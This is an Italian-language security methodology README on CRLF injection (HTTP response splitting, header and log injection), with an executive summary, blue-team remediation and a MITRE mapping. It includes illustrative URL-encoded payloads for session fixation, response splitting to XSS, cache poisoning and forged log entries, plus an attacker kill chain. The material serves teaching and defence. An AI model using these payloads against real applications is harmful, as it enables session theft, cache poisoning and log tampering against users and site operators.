> [English](README.en.md) | **Italiano**

# CRLF injection (HTTP response splitting / header injection)

> - **Fase:** Web Exploitation - OWASP A03:2021 Injection (iniezione di caratteri CR/LF in header o log)
> - **Visibilita:** Bassa/Media - richieste con sequenze CRLF codificate nei parametri; header di risposta anomali o voci di log malformate
> - **Prerequisiti:** un'applicazione che riflette input dell'utente dentro un header di risposta HTTP (es. `Location` in un redirect, `Set-Cookie`, header custom) o dentro un file di log, senza filtrare CR/LF
> - **Natura del documento:** metodologia. Payload illustrativi (forma didattica OWASP), nessun Finding ID fabbricato (prossimo `WEB-016`, da assegnare in lab).

- Obiettivo: iniettare i caratteri di fine riga CR (`%0d`) e LF (`%0a`) per aggiungere header arbitrari, dividere la risposta HTTP (response splitting), avvelenare cache e log, o concatenare una XSS riflessa.

---

## Executive summary

Il protocollo HTTP separa header e corpo con sequenze CRLF (`\r\n`). Se un'applicazione inserisce input
dell'utente dentro un header di risposta senza rimuovere CR/LF, un attaccante puo iniettare `%0d%0a` e
"spezzare" la struttura della risposta: aggiungere header a piacere (`Set-Cookie`, redirect), iniettare un
secondo corpo di risposta (HTTP response splitting), o, se la risposta viene memorizzata in cache, servire
contenuto malevolo ad altri utenti (cache poisoning). La stessa tecnica, applicata a un valore che finisce in un
file di **log**, permette di forgiare o falsificare voci di log (log injection).

Gli impatti vanno dal basso (redirect manipolato, header spoofing) al medio/alto (cache poisoning verso tutti
gli utenti, XSS riflessa via response splitting, falsificazione dei log a fini anti-forensics). La severity
tipica e `Medio`, con escalation ad `Alto` quando la risposta e cacheable o la splitting porta a XSS.

## Contesto operativo (perche, prima del come)

La CRLF Injection si cerca ovunque un parametro finisca in un header di risposta: redirect (`Location`),
impostazione di cookie, header di lingua/tracking, e nei sistemi che loggano input non filtrato. La decisione
operativa e capire dove l'input viene riflesso (header vs log) e se la risposta e cacheable: e la differenza tra
un impatto limitato al singolo utente e uno che colpisce tutti i visitatori (cache poisoning). Il test e minimo
e non distruttivo: si inietta una sequenza CRLF con un header innocuo e si verifica se compare nella risposta.

## Esecuzione / comandi

### Fase 1 - conferma della vulnerabilita

Si inietta una sequenza CRLF codificata seguita da un header di test innocuo in un parametro riflesso in un
header (es. il target di un redirect):

```
# valore del parametro (forma didattica, header di test innocuo)
%0d%0aX-Injected-Test:%20crlf-ok
```

Output illustrativo (rappresentativo, header della risposta):

```
HTTP/1.1 302 Found
Location: /home
X-Injected-Test: crlf-ok        <-- l'header iniettato compare: CRLF injection confermata
```

### Fase 2 - impatti (payload)

Valore iniettato nel parametro riflesso in un header (es. il target di un redirect). `%0d%0a` = CRLF:

```
# Header injection: imposta un cookie di sessione scelto dall'attaccante (session fixation)
/redirect?url=%0d%0aSet-Cookie:%20SESSIONID=attacker_fixed_value

# Open redirect / header spoofing
/redirect?url=%0d%0aLocation:%20https://evil.lab

# HTTP response splitting: doppio CRLF chiude gli header e inietta un corpo controllato -> XSS riflessa
/redirect?url=%0d%0a%0d%0a<script>alert(document.cookie)</script>

# Variante completa (status + header + body) per avvelenare una cache condivisa
/x?p=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>

# Log injection: inietta una riga di log falsa / spezza il parsing (anti-forensics)
/login?user=admin%0d%0a2026-01-01%2000:00:00%20INFO%20login%20riuscito%20per%20admin
```

Se la risposta avvelenata finisce in una **cache** condivisa, il contenuto malevolo viene servito ad altri
utenti (cache poisoning). Il principio e sempre l'iniezione di `%0d%0a` per uscire dal contesto previsto
(un header, una riga di log) e iniettare struttura controllata.

## Analisi dei risultati

La conferma (Fase 1) dimostra che l'input raggiunge gli header senza filtraggio dei CR/LF. L'impatto reale
dipende dal contesto: `Basso` per un semplice header spoofing o redirect; `Medio` per session fixation o log
injection; `Alto` quando la risposta e cacheable (cache poisoning verso tutti gli utenti) o quando la response
splitting consente XSS riflessa. Se il framework rifiuta i CR/LF negli header (comportamento di default di molti
stack moderni) il vettore e chiuso.

### Analisi teorica

La CRLF Injection e il problema dati/istruzioni [Su & Wassermann 2006] applicato alla struttura del protocollo
HTTP: i CR/LF sono i delimitatori sintattici tra header e tra header e corpo. Se l'input dell'utente (dato) puo
contenere quei delimitatori, l'utente controlla la struttura della risposta (codice). La contromisura e
rimuovere o codificare CR/LF nell'input destinato a header e log, oppure - meglio - usare API che costruiscono
gli header in modo strutturato e rifiutano i newline (gran parte dei framework moderni lo fa di default). Vale
anche per i log: trattare l'input come dato, non come riga di log.

## Remediation (blue team)

**Rilevamento (WAF/SIEM).**
- Parametri contenenti `%0d`, `%0a`, `\r`, `\n` o varianti codificate (doppia URL-encoding).
- Header di risposta inattesi o duplicati; risposte con struttura anomala.
- Voci di log con newline iniettati o con righe "impossibili" (indice di log injection).

**Hardening (secure coding).**
- Non inserire input non fidato negli header di risposta; se indispensabile, rimuovere/codificare CR/LF
  (contromisura primaria).
- Usare le API del framework per impostare header e cookie (la maggior parte rifiuta i newline).
- Validare i target di redirect (whitelist) e sanitizzare l'input che finisce nei log.
- Configurare correttamente le cache per non memorizzare risposte influenzate da input non fidato.

---

## Scenario reale: proiezione Post-Exploitation

> Vale per gli esiti con escalation (cache poisoning / XSS via response splitting, severity Alto).

### Prospettiva attaccante (red team)

**Punto di partenza:** parametro riflesso in un header di risposta, senza filtro CR/LF (confermato in Fase 1).

**Passo successivo immediato:** se la risposta e cacheable, costruire un avvelenamento della cache; altrimenti
tentare session fixation o response splitting verso XSS.

**Kill Chain proiettata:**

```
CRLF Injection in un header di risposta
        |
        v
Response splitting / cache poisoning (se la risposta e cacheable)
        |
        v
Contenuto malevolo servito ad altri utenti (XSS riflessa persistente in cache)
        |
        v
Furto sessioni / credenziali degli utenti colpiti (vedi XSS)
```

**Impatto potenziale:** da manipolazione della singola risposta a impatto su molti utenti quando la cache e
coinvolta; il collegamento naturale e con la [XSS](<../xss (Cross-Site Scripting)/README.md>).

**Vettori di monetizzazione tipici:** furto di sessioni di massa; defacement via cache; depistaggio tramite log
falsificati.

### Prospettiva difensore (blue team)

**Rilevamento:** CRLF codificati nei parametri; header di risposta anomali; log con newline iniettati.

**Indicatori di Compromissione (IOC):**
- Parametri con `%0d%0a` o doppia codifica.
- Risposte HTTP con header duplicati o corpi inattesi.
- Voci di log spezzate o incoerenti.

**Contenimento:** blocco del pattern via WAF; invalidazione delle cache potenzialmente avvelenate; revisione dei
log sospetti.

**Eradicazione e hardening:** filtraggio CR/LF; API strutturate per header/cookie; whitelist dei redirect;
sanitizzazione dei log; configurazione corretta delle cache.

**Lezione difensiva:** la CRLF Injection mostra che anche i delimitatori "invisibili" di un protocollo sono
superficie di attacco. La difesa e trattare l'input come dato anche quando finisce in un header o in un log, mai
come parte della struttura.

---

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `Burp Suite` | proxy/scanner | web - attivo | intercetta e modifica i parametri; test di iniezione crlf negli header |
| `curl` | http client | cli - attivo | invio manuale di richieste con sequenze crlf codificate |
| `crlfuzz` | scanner crlf | cli - attivo | scansione automatizzata di endpoint per crlf injection |

## Note di metodologia

In lab reale (es. un'app con redirect basato su parametro o un target didattico) i dati da documentare come
finding: la conferma dell'header iniettato, il contesto (header vs log) e l'eventuale escalation (cache/XSS). I
payload mostrati sono header di test innocui; le forme operative complete non sono riprodotte.

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| initial access | exploit public-facing application | `T1190` | iniezione di cr/lf in un header di risposta di un'applicazione esposta. |
| impact | data manipulation: stored data manipulation | `T1565.001` | avvelenamento della cache e falsificazione di voci di log tramite response splitting / log injection. |

---

## Correlazioni con altri finding

| provenienza | questa tecnica | effetto |
| :--- | :--- | :--- |
| [02-web-recon](<../../02-web-recon (Enumeration)/README.md>) | crlf injection | l'enumerazione individua redirect e endpoint che riflettono input negli header |
| crlf injection (response splitting) | [xss](<../xss (Cross-Site Scripting)/README.md>) | la splitting puo introdurre un corpo controllato da cui parte una xss riflessa |
| crlf injection | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.md>) | la remediation (filtro cr/lf, api strutturate) si collega al laboratorio di secure coding |

---

> **Nota:** Contenuto didattico e di metodologia. Le tecniche vanno eseguite esclusivamente su applicazioni di proprieta o con autorizzazione esplicita. I payload sono illustrativi e non provengono da sistemi reali o di terze parti.
